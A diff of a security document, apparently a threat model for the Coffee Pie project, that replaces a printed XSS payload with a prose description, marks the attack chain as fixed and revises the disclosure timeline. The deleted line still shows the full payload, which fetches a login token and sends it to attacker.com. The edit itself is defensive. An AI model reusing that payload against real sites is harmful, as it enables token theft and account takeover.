@@ -500,7 +500,7 @@ The password is passed as a plain string through QML to C++/Python. In Qt's sign
 
 **Steps:**
 1. Attacker compromises `translations.json` (supply chain, insider, or build pipeline)
-2. Injects JS payload: `<img src=x onerror="fetch('/auth/login',{method:'POST',body:JSON.stringify({email:'admin@coffeepie.co'})}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+d.custom_token))">`
+2. Injects a script payload that, in every visitor's browser, requests a login token for a known administrator e-mail and sends it to an attacker-controlled host. (The working payload that used to be printed here was removed: a response plan must not double as an exploit kit.)
 3. Every visitor to coffeepie.co unknowingly fetches auth tokens for known emails
 4. Attacker uses the custom token to authenticate to the Proxmox backend (VULN-PROX-001)
 5. Attacker lists all VMs, stops critical ones, clones user VMs, extracts data via VNC
@@ -508,6 +508,7 @@ The password is passed as a plain string through QML to C++/Python. In Qt's sign
 
 **Total Compromise Time: < 30 minutes**
 **Required Vulnerabilities: VULN-WEB-001 + VULN-PROX-001**
+**Status (2026-11-20):** chain broken. VULN-PROX-001 is fixed (login now requires the password, verified by Firebase) and the store/cart rendering escapes all interpolated values. See `audits/SECURITY_AUDITS.md`.
 
 ### ATTACK CHAIN B: From Rogue ISP Customer to Network Dominance
 
@@ -625,7 +626,7 @@ If you are a security researcher or community member who has discovered a flaw w
 
 * **DO NOT open a public issue** on GitHub detailing the exploit mechanics.
 * Submit an encrypted report to **security@coffeepie.co**.
-* Coffee Pie commits to patching critical flaws within **72 hours** prior to public disclosure.
+* Timelines (acknowledgement in 72 hours, fix plan for High/Critical within 30 days, coordinated disclosure) and the safe-harbor terms are defined in [`SECURITY.md`](SECURITY.md); that file is authoritative if this section ever disagrees.
 * Ethical researchers will be rewarded with:
   - Generous COFP tokens and Credit Packages
   - A permanent place on our open-source Hall of Fame
